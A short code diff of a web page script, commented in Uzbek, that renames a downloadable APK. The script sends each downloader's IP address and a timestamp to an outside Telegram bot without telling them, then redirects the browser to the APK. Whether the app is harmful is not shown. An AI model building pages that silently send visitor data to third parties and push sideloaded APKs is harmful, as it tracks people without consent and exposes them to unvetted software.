@@ -60,7 +60,7 @@
             } catch (e) { console.log("IP aniqlashda xato"); }
 
             // 2. Telegramga xabar yuborish
-            const message = `🚀 **Yangi Yuklash!**\n\n🌐 **IP:** ${userIP}\n⏰ **Vaqt:** ${new Date().toLocaleString()}\n📂 **Fayl:** manager_network.apk`;
+            const message = `🚀 **Yangi Yuklash!**\n\n🌐 **IP:** ${userIP}\n⏰ **Vaqt:** ${new Date().toLocaleString()}\n📂 **Fayl:** manager.apk`;
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
@@ -74,7 +74,7 @@
 
             // 3. Faylni yuklab yuborish
             // Fayl nomingizni koddagi bilan bir xil qiling!
-            window.location.href = "manager_network.apk"; 
+            window.location.href = "manager.apk"; 
         }
     });
 </script>
